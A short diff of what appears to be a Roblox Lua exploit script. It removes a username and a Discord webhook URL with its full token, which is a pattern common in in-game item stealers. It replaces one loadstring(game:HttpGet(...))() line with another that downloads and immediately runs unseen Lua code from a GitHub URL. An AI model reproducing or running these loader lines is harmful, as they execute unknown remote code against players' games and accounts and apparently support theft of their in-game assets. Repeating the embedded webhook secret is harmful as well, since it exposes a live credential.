@@ -1,4 +1,4 @@
-UserName = "armanduka777"
-WebHook = "https://discord.com/api/webhooks/1074319193685622924/H_rSYfeNDcZ1TEjsm6AQjwaYcglY94eN66MdjvpCdB7I0h4gl9MNFDOAYyYbzs8pKpMz"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/localyactive/projects/main/folder/hg"))()
+
